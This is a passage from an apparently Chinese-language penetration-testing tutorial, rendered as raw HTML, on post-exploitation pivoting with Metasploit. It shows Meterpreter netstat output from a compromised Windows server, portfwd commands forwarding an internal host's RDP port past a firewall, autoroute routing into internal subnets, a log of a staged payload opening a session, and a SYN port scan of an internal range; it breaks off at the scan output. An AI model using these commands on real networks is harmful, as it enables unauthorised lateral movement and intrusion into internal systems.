</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">47
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">48
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">49
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">50
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">51
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">52
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">53
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">54
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>meterpreter &gt; netstat -anpt
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Connection list
</span></span><span style=display:flex><span>===============
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    Proto  Local address                  Remote address       State        User  Inode  PID/Program name
</span></span><span style=display:flex><span>    -----  -------------                  --------------       -----        ----  -----  ----------------
</span></span><span style=display:flex><span>    tcp    169.254.191.36:139             0.0.0.0:*            LISTEN       0     0      4/System
</span></span><span style=display:flex><span>    tcp    0.0.0.0:135                    0.0.0.0:*            LISTEN       0     0      12/svchost.exe
</span></span><span style=display:flex><span>    tcp    0.0.0.0:445                    0.0.0.0:*            LISTEN       0     0      4/System
</span></span><span style=display:flex><span>    tcp    0.0.0.0:3306                   0.0.0.0:*            LISTEN       0     0      1740/mysqld.exe
</span></span><span style=display:flex><span>    tcp    0.0.0.0:3389                   0.0.0.0:*            LISTEN       0     0      3740/svchost.exe
</span></span><span style=display:flex><span>    tcp    0.0.0.0:47001                  0.0.0.0:*            LISTEN       0     0      4/System
</span></span><span style=display:flex><span>    tcp    0.0.0.0:49152                  0.0.0.0:*            LISTEN       0     0      828/wininit.exe
</span></span><span style=display:flex><span>    tcp    0.0.0.0:49153                  0.0.0.0:*            LISTEN       0     0      1052/svchost.exe
</span></span><span style=display:flex><span>    tcp    0.0.0.0:49154                  0.0.0.0:*            LISTEN       0     0      1108/svchost.exe
</span></span><span style=display:flex><span>    tcp    0.0.0.0:21                     0.0.0.0:*            LISTEN       0     0      1692/svchost.exe
</span></span><span style=display:flex><span>    tcp    0.0.0.0:49160                  0.0.0.0:*            LISTEN       0     0      932/lsass.exe
</span></span><span style=display:flex><span>    tcp    0.0.0.0:49161                  0.0.0.0:*            LISTEN       0     0      924/services.exe
</span></span><span style=display:flex><span>    tcp    10.159.63.178:139              0.0.0.0:*            LISTEN       0     0      4/System
</span></span><span style=display:flex><span>    tcp    10.159.191.178:139             0.0.0.0:*            LISTEN       0     0      4/System
</span></span><span style=display:flex><span>    tcp    10.159.191.178:58359           *.*.*.*:1131   ESTABLISHED  0     0      5576/1.exe
</span></span><span style=display:flex><span>    tcp    10.159.191.178:58362           *.*.*.*:1131   ESTABLISHED  0     0      4700/1.exe
</span></span><span style=display:flex><span>    tcp    10.159.191.178:58590           *.*.*.*:4961  SYN_SENT     0     0      2472/Ijkptue.exe
</span></span><span style=display:flex><span>    tcp    169.254.112.31:139             0.0.0.0:*            LISTEN       0     0      4/System
</span></span><span style=display:flex><span>    tcp    0.0.0.0:80                     0.0.0.0:*            LISTEN       0     0      1584/httpd.exe
</span></span><span style=display:flex><span>    tcp6   :::49160                       :::*                 LISTEN       0     0      932/lsass.exe
</span></span><span style=display:flex><span>    tcp6   :::21                          :::*                 LISTEN       0     0      1692/svchost.exe
</span></span><span style=display:flex><span>    tcp6   :::80                          :::*                 LISTEN       0     0      1584/httpd.exe
</span></span><span style=display:flex><span>    tcp6   :::135                         :::*                 LISTEN       0     0      12/svchost.exe
</span></span><span style=display:flex><span>    tcp6   :::445                         :::*                 LISTEN       0     0      4/System
</span></span><span style=display:flex><span>    tcp6   :::3389                        :::*                 LISTEN       0     0      3740/svchost.exe
</span></span><span style=display:flex><span>    tcp6   :::47001                       :::*                 LISTEN       0     0      4/System
</span></span><span style=display:flex><span>    tcp6   :::49152                       :::*                 LISTEN       0     0      828/wininit.exe
</span></span><span style=display:flex><span>    tcp6   :::49153                       :::*                 LISTEN       0     0      1052/svchost.exe
</span></span><span style=display:flex><span>    tcp6   :::49154                       :::*                 LISTEN       0     0      1108/svchost.exe
</span></span><span style=display:flex><span>    tcp6   :::49161                       :::*                 LISTEN       0     0      924/services.exe
</span></span><span style=display:flex><span>    udp    0.0.0.0:500                    0.0.0.0:*                         0     0      1108/svchost.exe
</span></span><span style=display:flex><span>    udp    0.0.0.0:4500                   0.0.0.0:*                         0     0      1108/svchost.exe
</span></span><span style=display:flex><span>    udp    0.0.0.0:5355                   0.0.0.0:*                         0     0      1248/svchost.exe
</span></span><span style=display:flex><span>    udp    10.159.63.178:137              0.0.0.0:*                         0     0      4/System
</span></span><span style=display:flex><span>    udp    10.159.63.178:138              0.0.0.0:*                         0     0      4/System
</span></span><span style=display:flex><span>    udp    10.159.191.178:137             0.0.0.0:*                         0     0      4/System
</span></span><span style=display:flex><span>    udp    10.159.191.178:138             0.0.0.0:*                         0     0      4/System
</span></span><span style=display:flex><span>    udp    169.254.112.31:137             0.0.0.0:*                         0     0      4/System
</span></span><span style=display:flex><span>    udp    169.254.112.31:138             0.0.0.0:*                         0     0      4/System
</span></span><span style=display:flex><span>    udp    169.254.191.36:137             0.0.0.0:*                         0     0      4/System
</span></span><span style=display:flex><span>    udp    169.254.191.36:138             0.0.0.0:*                         0     0      4/System
</span></span><span style=display:flex><span>    udp6   :::500                         :::*                              0     0      1108/svchost.exe
</span></span><span style=display:flex><span>    udp6   :::4500                        :::*                              0     0      1108/svchost.exe
</span></span><span style=display:flex><span>    udp6   :::5355                        :::*                              0     0      1248/svchost.exe
</span></span><span style=display:flex><span>    udp6   fe80::1d1d:79:e7f1:701f:546    :::*                              0     0      1052/svchost.exe
</span></span><span style=display:flex><span>    udp6   fe80::35ec:8852:7f1f:321d:546  :::*                              0     0      1052/svchost.exe
</span></span><span style=display:flex><span>    udp6   fe80::4d1c:361b:b5e7:5894:546  :::*                              0     0      1052/svchost.exe
</span></span></code></pre></td></tr></table></div></div><p>可以看出服务器开启了3389，假设我如果需要连接3389该怎么办呢？ - (刚才提到了，有防火墙的限制)</p><h3 id=使用portfwd>使用portfwd</h3><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>meterpreter &gt; portfwd -h
</span></span><span style=display:flex><span>Usage: portfwd [-h] [add | delete | list | flush] [args]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>OPTIONS:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    -L &lt;opt&gt;  转发: 本地监听地址  反向: 本地主机连接到某个地址
</span></span><span style=display:flex><span>    -R        表示正向反向端口
</span></span><span style=display:flex><span>    -h        帮助信息
</span></span><span style=display:flex><span>    -i &lt;opt&gt;  端口转发条目的索引与交互（请参阅“列表”命令）
</span></span><span style=display:flex><span>    -l &lt;opt&gt;  转发：本地端口收听  反向：本地端口连接
</span></span><span style=display:flex><span>    -p &lt;opt&gt;  转发：远程端口连接  反向：远程端口监听
</span></span><span style=display:flex><span>    -r &lt;opt&gt;  转发：连接到远程主机
</span></span></code></pre></td></tr></table></div></div><p>下面来练习一下（正向转发）</p><blockquote><p>目的：将内网某台主机的3389转发到本地</p></blockquote><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>portfwd add -L 0.0.0.0 -l 1144 -p 3389 -r 10.159.63.178
</span></span></code></pre></td></tr></table></div></div><p>此时连接本机的1144就相当于连接10.159.63.178</p><blockquote><p>目的：将内网某台主机端口流量转发到某台外网主机 (可做端口劫持)</p></blockquote><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>portfwd add -R -l 8080 -p 1478 -L 10.159.191.2
</span></span></code></pre></td></tr></table></div></div><p>此时访问10.159.63.178的1478端口就相当于访问10.159.191.2的8080端口</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>portfwd delete -i 1
</span></span></code></pre></td></tr></table></div></div><p>删除条目为1的端口转发</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>portfwd list
</span></span></code></pre></td></tr></table></div></div><p>列出端口转发条目</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>portfwd flush
</span></span></code></pre></td></tr></table></div></div><p>清空所有转发</p><h3 id=端口扫描>端口扫描</h3><blockquote><p>添加路由表:</p></blockquote><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>meterpreter &gt; run autoroute -s 10.159.0.0 255.255.128.0
</span></span><span style=display:flex><span>meterpreter &gt; run autoroute -s 10.159.128.0 255.255.128.0
</span></span><span style=display:flex><span>meterpreter &gt; run autoroute -s 10.159.63.0 255.255.255.128
</span></span><span style=display:flex><span>meterpreter &gt; run autoroute -s 10.159.191.0 255.255.255.128
</span></span></code></pre></td></tr></table></div></div><p>当然在上线前，你就设置好自动添加路由，就不需要去手动添加了：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-gdscript3 data-lang=gdscript3><span style=display:flex><span>msf auxiliary(tcp) <span style=color:#f92672>&gt;</span> load auto_add_route
</span></span><span style=display:flex><span>msf auxiliary(tcp) <span style=color:#f92672>&gt;</span> 
</span></span><span style=display:flex><span>[<span style=color:#f92672>*</span>] Sending stage (<span style=color:#ae81ff>179267</span> bytes) to <span style=color:#f92672>***.***.***.***</span>
</span></span><span style=display:flex><span>[<span style=color:#f92672>*</span>] Meterpreter session <span style=color:#ae81ff>9</span> opened (<span style=color:#ae81ff>192.168</span><span style=color:#f92672>.</span><span style=color:#ae81ff>3.14</span>:<span style=color:#ae81ff>1131</span> <span style=color:#f92672>-&gt;</span> <span style=color:#f92672>***.***.***.***</span>:<span style=color:#ae81ff>60372</span>) at <span style=color:#ae81ff>2018</span><span style=color:#f92672>-</span><span style=color:#ae81ff>01</span><span style=color:#f92672>-</span><span style=color:#ae81ff>02</span> <span style=color:#ae81ff>15</span>:<span style=color:#ae81ff>22</span>:<span style=color:#ae81ff>20</span> <span style=color:#f92672>+</span><span style=color:#ae81ff>0800</span>
</span></span><span style=display:flex><span>[<span style=color:#f92672>*</span>] AutoAddRoute: Routing new subnet <span style=color:#ae81ff>10.0</span><span style=color:#f92672>.</span><span style=color:#ae81ff>0.0</span><span style=color:#f92672>/</span><span style=color:#ae81ff>255.0</span><span style=color:#f92672>.</span><span style=color:#ae81ff>0.0</span> through session <span style=color:#ae81ff>9</span>
</span></span><span style=display:flex><span>[<span style=color:#f92672>*</span>] AutoAddRoute: Routing new subnet <span style=color:#ae81ff>10.159</span><span style=color:#f92672>.</span><span style=color:#ae81ff>0.0</span><span style=color:#f92672>/</span><span style=color:#ae81ff>255.255</span><span style=color:#f92672>.</span><span style=color:#ae81ff>128.0</span> through session <span style=color:#ae81ff>9</span>
</span></span><span style=display:flex><span>[<span style=color:#f92672>*</span>] AutoAddRoute: Routing new subnet <span style=color:#ae81ff>10.159</span><span style=color:#f92672>.</span><span style=color:#ae81ff>63.128</span><span style=color:#f92672>/</span><span style=color:#ae81ff>255.255</span><span style=color:#f92672>.</span><span style=color:#ae81ff>255.128</span> through session <span style=color:#ae81ff>9</span>
</span></span><span style=display:flex><span>[<span style=color:#f92672>*</span>] AutoAddRoute: Routing new subnet <span style=color:#ae81ff>10.159</span><span style=color:#f92672>.</span><span style=color:#ae81ff>128.0</span><span style=color:#f92672>/</span><span style=color:#ae81ff>255.255</span><span style=color:#f92672>.</span><span style=color:#ae81ff>128.0</span> through session <span style=color:#ae81ff>9</span>
</span></span><span style=display:flex><span>[<span style=color:#f92672>*</span>] AutoAddRoute: Routing new subnet <span style=color:#ae81ff>10.159</span><span style=color:#f92672>.</span><span style=color:#ae81ff>191.128</span><span style=color:#f92672>/</span><span style=color:#ae81ff>255.255</span><span style=color:#f92672>.</span><span style=color:#ae81ff>255.128</span> through session <span style=color:#ae81ff>9</span>
</span></span><span style=display:flex><span>[<span style=color:#f92672>*</span>] AutoAddRoute: Routing new subnet <span style=color:#ae81ff>169.254</span><span style=color:#f92672>.</span><span style=color:#ae81ff>0.0</span><span style=color:#f92672>/</span><span style=color:#ae81ff>255.255</span><span style=color:#f92672>.</span><span style=color:#ae81ff>0.0</span> through session <span style=color:#ae81ff>9</span>
</span></span><span style=display:flex><span>[<span style=color:#f92672>*</span>] AutoAddRoute: Routing new subnet <span style=color:#ae81ff>192.168</span><span style=color:#f92672>.</span><span style=color:#ae81ff>0.0</span><span style=color:#f92672>/</span><span style=color:#ae81ff>255.255</span><span style=color:#f92672>.</span><span style=color:#ae81ff>0.0</span> through session <span style=color:#ae81ff>9</span>
</span></span><span style=display:flex><span>[<span style=color:#f92672>-</span>] The <span style=color:#e6db74>&#39;stdapi&#39;</span> extension has already been loaded<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>msf auxiliary(tcp) <span style=color:#f92672>&gt;</span> sessions <span style=color:#f92672>-</span>i <span style=color:#ae81ff>9</span> 
</span></span><span style=display:flex><span>[<span style=color:#f92672>*</span>] Starting interaction with <span style=color:#ae81ff>9.</span><span style=color:#f92672>..</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>meterpreter <span style=color:#f92672>&gt;</span> 
</span></span></code></pre></td></tr></table></div></div><p>但是它也有弊端，就是子网太大了，可能会将我们的数据包广播出去，所以最好记一下子网大小，手动灵活添加路由~</p><blockquote><p>扫描</p></blockquote><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>msf exploit(handler) &gt; use auxiliary/scanner/portscan/syn
</span></span><span style=display:flex><span>msf auxiliary(syn) &gt; set PORTS 22-25,80-85,1433,3306,3389,445,135,139
</span></span><span style=display:flex><span>PORTS =&gt; 22-25,80-85,1433,3306,3389,445,135,139
</span></span><span style=display:flex><span>msf auxiliary(syn) &gt; set RHOSTS 10.159.191.1-254
</span></span><span style=display:flex><span>RHOSTS =&gt; 10.159.191.1-254
</span></span><span style=display:flex><span>msf auxiliary(syn) &gt; run
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">40
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">41
